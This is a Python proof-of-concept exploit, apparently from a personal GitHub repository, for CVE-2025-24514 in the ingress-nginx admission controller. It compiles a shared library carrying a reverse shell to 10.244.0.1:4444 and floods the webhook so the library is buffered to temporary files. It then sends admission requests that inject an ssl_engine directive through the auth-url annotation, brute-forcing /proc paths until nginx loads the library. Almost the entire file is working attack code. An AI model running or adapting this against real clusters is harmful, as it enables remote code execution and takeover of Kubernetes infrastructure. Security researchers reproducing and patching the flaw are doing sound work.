# litios.github.io
#
#  ██▓     ██▓▄▄▄█████▓ ██▓ ▒█████    ██████ 
# ▓██▒    ▓██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒▒██    ▒ 
# ▒██░    ▒██▒▒ ▓██░ ▒░▒██▒▒██░  ██▒░ ▓██▄   
# ▒██░    ░██░░ ▓██▓ ░ ░██░▒██   ██░  ▒   ██▒
# ░██████▒░██░  ▒██▒ ░ ░██░░ ████▓▒░▒██████▒▒
# ░ ▒░▓  ░░▓    ▒ ░░   ░▓  ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
# ░ ░ ▒  ░ ▒ ░    ░     ▒ ░  ░ ▒ ▒░ ░ ░▒  ░ ░
#   ░ ░    ▒ ░  ░       ▒ ░░ ░ ░ ▒  ░  ░  ░  
#     ░  ░ ░            ░      ░ ░        ░  
#                                      
      
import http.client
import threading
import time
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import subprocess
import sys

requests.packages.urllib3.disable_warnings() 

REVERSE_SHELL_HOST = "10.244.0.1"
REVERSE_SHELL_PORT = "4444"

WEBHOOK_HOST = "localhost"
WEBHOOK_PORT = 8443
WEBHOOK_ENDPOINT = "/"

VALIDATOR_URL = "https://localhost:8444/validate"

TEMPLATE_PATH = "template.json"

MAX_THREADS = 30
PID_START = 30
PID_END = 100

SHELL_SPAWNED = threading.Event()

with open(TEMPLATE_PATH) as f:
    TEMPLATE = json.load(f)

def compile() -> str:
    with open('shared.c', "r") as f:
        data = f.read()
    
    data = data.replace("HOST", REVERSE_SHELL_HOST)
    data = data.replace("PORT", REVERSE_SHELL_PORT)

    with open('shared-tmp.c', 'w+') as f:
        f.write(data)
    
    result = subprocess.run("gcc -fPIC -shared -g -o shared shared-tmp.c", shell=True, capture_output=True)
    if result.returncode != 0:
        print('Error creating binary')
        print(result.stdout)
        print(result.stderr)
        sys.exit(1)

def spam_temp_files(id: int):
    with open("shared", 'rb') as f:
        file_data = f.read()
    headers = {"Content-Length": str(len(file_data) + 1)}

    for i in range(100):
        if SHELL_SPAWNED.is_set():
            return
        conn = http.client.HTTPConnection(WEBHOOK_HOST, WEBHOOK_PORT)
        print(f'[{id}] Sending shared lib - attempt {i} - data len: {len(file_data)}')
        conn.request("POST", WEBHOOK_ENDPOINT, body=file_data, headers=headers)
        try:
            conn.getresponse()
            conn.close()
        except:
            pass

def CVE_2025_24514_gen_template(pid: int, fd: int) -> str:
    data = TEMPLATE.copy()
    data["request"]["object"]["metadata"]["annotations"]["nginx.ingress.kubernetes.io/auth-url"] = \
        "http://example.com/#;\n}\n}\n}\n" + f"ssl_engine ../../../proc/{pid}/fd/{fd}"
    return json.dumps(data)

def attempt_exec(pid: int, botom_fd: int = 20, top_fd: int = 40):
    headers = {"Content-Type": "application/json"}
    for fd in range(botom_fd, top_fd):
        if SHELL_SPAWNED.is_set():
            return
        data = CVE_2025_24514_gen_template(pid, fd)
        try:
            response = requests.post("https://localhost:8444/validate", data=data, headers=headers, verify=False, timeout=5)
            print(f'Trying /proc/{pid}/fd/{fd} -> rc {response.status_code}')
        except requests.Timeout:
            print('Shell should be ready -- closing threads')
            SHELL_SPAWNED.set()
            

if __name__ == "__main__":
    compile()
    threads = []
    for i in range(MAX_THREADS):
        t = threading.Thread(target=spam_temp_files, args=(i,))
        t.start()
        threads.append(t)

    time.sleep(1)
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(attempt_exec, range(PID_START, PID_END)) 
    
    for t in threads:
        t.join()
